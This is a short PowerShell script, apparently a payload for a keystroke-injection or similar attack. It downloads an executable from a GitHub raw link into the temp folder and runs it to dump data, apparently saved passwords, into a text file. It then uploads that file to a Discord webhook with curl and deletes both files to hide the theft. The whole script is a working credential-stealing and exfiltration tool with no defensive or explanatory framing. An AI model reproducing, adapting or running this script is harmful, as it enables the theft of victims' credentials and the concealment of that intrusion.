Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$env:TEMP\p.exe";
Start-Sleep -Seconds 2;
& $env:TEMP\p.exe /stext "$env:TEMP\data.txt";
Start-Sleep -Seconds 1;

$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
curl.exe -F "file1=@$env:TEMP\data.txt" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");

Remove-Item -Path "$env:TEMP\p.exe";
Remove-Item -Path "$env:TEMP\data.txt";
